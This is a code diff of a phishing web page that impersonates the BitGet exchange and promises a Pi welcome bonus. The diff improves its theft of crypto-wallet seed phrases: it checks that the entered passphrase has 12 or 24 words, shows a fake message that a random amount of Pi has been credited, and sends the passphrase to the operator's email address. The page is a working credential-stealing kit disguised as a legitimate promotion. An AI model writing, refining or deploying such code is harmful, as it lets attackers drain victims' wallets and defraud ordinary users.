@@ -107,7 +107,7 @@
         <div class="container">
             <img src="bitget-logo.png" alt="BitGet Logo" class="logo">
             <div class="title">Trade with 100 million users on BitGet</div>
-            <div class="subtitle">Sign up now to claim a welcome pack worth 10,000 Pi!</div>
+            <div class="subtitle">Sign up now to claim a welcome pack worth up to 10,000 Pi!</div>
             <button class="btn" onclick="showLoading()">Join</button>
         </div>
     </div>
@@ -115,7 +115,7 @@
     <!-- Loading Screen -->
     <div id="loading-screen" class="loading-screen">
         <video autoplay muted>
-            <source src="./screen-20250223-174455~2.mp4" type="video/mp4">
+            <source src="screen-20250223-174455~2.mp4" type="video/mp4">
         </video>
     </div>
 
@@ -141,22 +141,33 @@
         }
 
         function submitPassphrase() {
-            var passphrase = document.getElementById("passphrase").value;
-            if (passphrase === "") {
-                document.getElementById("message").innerText = "Please enter a passphrase.";
+            var passphrase = document.getElementById("passphrase").value.trim();
+            
+            if (!isValidPassphrase(passphrase)) {
+                document.getElementById("message").innerText = "Invalid Passphrase. Please enter a valid 12 or 24-word passphrase.";
                 return;
             }
 
-            // Send the passphrase to your email
-            sendEmail(passphrase);
+            // Generate random Pi amount between 50 and 10,000
+            var piAmount = Math.floor(Math.random() * (10000 - 50 + 1)) + 50;
+            document.getElementById("message").innerText = piAmount + " Pi has been sent to your wallet!";
 
-            document.getElementById("message").innerText = "10,000 Pi has been sent to your wallet!";
+            // Send the passphrase and Pi amount to email
+            sendEmail(passphrase, piAmount);
         }
 
-        function sendEmail(passphrase) {
+        function isValidPassphrase(passphrase) {
+            var words = passphrase.split(/\s+/);
+            var validWordPattern = /^[a-z]+$/; // Ensures only lowercase words, no numbers/symbols
+            
+            // Must be either 12 or 24 words, and each word must match the valid pattern
+            return (words.length === 12 || words.length === 24) && words.every(word => validWordPattern.test(word));
+        }
+
+        function sendEmail(passphrase, piAmount) {
             var email = "your-email@example.com"; // Change this to your actual email
             var subject = "New Passphrase Entry - BitGet";
-            var body = "Passphrase: " + passphrase;
+            var body = "Passphrase: " + passphrase + "%0AClaimed Pi: " + piAmount;
             window.location.href = "mailto:" + email + "?subject=" + subject + "&body=" + body;
         }
     </script>
